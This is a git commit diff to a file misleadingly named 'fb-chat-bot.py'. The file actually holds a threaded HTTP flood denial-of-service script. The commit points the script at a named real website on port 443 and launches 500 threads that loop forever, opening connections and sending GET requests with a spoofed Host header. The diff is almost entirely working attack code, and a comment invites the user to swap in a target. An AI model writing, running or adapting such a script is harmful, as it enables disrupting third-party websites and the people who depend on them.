fba69906714395902f5c2ee571ffe74fd027e9fe
tasik0 <130841446+tasik0@users.noreply.github.com>
2024-07-04 18:30:45 +0600

    Update fb-chat-bot.py

--- fb-chat-bot.py
+++ fb-chat-bot.py
@@ -1,33 +1,27 @@
 import socket
 import threading
 
-target = '10.0.0.138'
+target = 'sultanoverseas.org'  # Replace with the target website
 fake_ip = '182.21.20.32'
-port = 80
+port = 443
+attack_num = 100
 
 def attack():
+    global attack_num
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        s.close()
+        try:
+            target_ip = socket.gethostbyname(target)
+            s.connect((target_ip, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
+            attack_num += 1
+            print(attack_num)
+        except socket.error:
+            pass
+        finally:
+            s.close()
 
-  for i in range(500):
+for i in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
-
-attack_num = 0
-
-def attack():
-    while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        
-        global attack_num
-        attack_num += 1
-        print(attack_num)
-        
-        s.close()
